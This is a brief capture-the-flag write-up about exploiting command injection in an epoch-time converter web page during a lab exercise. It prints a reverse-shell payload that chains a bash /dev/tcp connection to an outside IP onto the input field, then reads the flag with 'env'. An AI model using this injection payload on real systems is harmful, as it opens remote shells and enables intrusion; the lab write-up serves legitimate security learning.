# Epoch

### Epoch
![image](https://github.com/user-attachments/assets/9b865ec0-8c4f-41f3-af37-5f6e706290ed)<br />
I need to inject commans into this converter. An **epoch**, also known as **Unix time** is the number of seconds that passed from 1970 at 00:00:00 UTC. Simply adding `;` and then a command injects the command: <br />
![image](https://github.com/user-attachments/assets/30385886-4429-40c2-ad59-2fea879c254e)<br />
So I spawned a reverse shell using the payload `1234;bash -i >& /dev/tcp/10.11.85.53/9001 0>&1`.
At this point I was stuck for a bit and had to look at the hint. The flag is in an environment variable, just run `env` to read it.

